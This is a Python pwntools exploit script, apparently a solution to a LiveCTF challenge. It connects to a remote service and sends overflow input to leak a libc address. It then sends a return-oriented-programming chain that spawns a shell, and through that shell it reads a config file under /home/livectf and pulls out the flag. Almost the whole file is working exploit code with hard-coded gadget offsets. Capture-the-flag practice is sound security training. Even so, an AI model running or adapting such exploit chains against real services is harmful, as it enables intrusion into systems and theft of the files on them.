#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))
sla = s.sendlineafter
sa = s.sendafter

sla(b'?\n',b'10')
sla(b'?\n',b'3')

s.recvuntil(b'?\n')
s.sendline(b'123451234\xff')

s.recvuntil(b'?\n')
pay = b'A' * 9 + b'\xff' + b'A' * (0x6c-10) + b'\xff'
s.sendline(pay)
data = s.recvuntil(b'What is your guess #3')

idx = data.find(b'\x90')
leak = b''
for i in range(6):
    leak += chr(data[idx+7*i]).encode('latin-1')
libc = (u64(leak + b"\x00"*2)) - 0x29d90
pause()

context.arch = 'amd64'
binsh = 1935000
prdi = (0x000000000002a745)

pay = b'A' * 9 + b'\x41' + b'A' * (0x62-10) + b'\x70'
pay += b'B' * 0x11 + p64(libc + prdi) + p64(libc +binsh) + p64(0) + p64(libc + 0x50d60) + b'C' * 0x100
s.sendline(pay)

s.sendline(b'./submitter')
s.sendline(b'./submitter')
s.sendline(b'cat /home/livectf/.config.toml')
s.sendline(b'cat /home/livectf/.config.toml')
flag = s.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
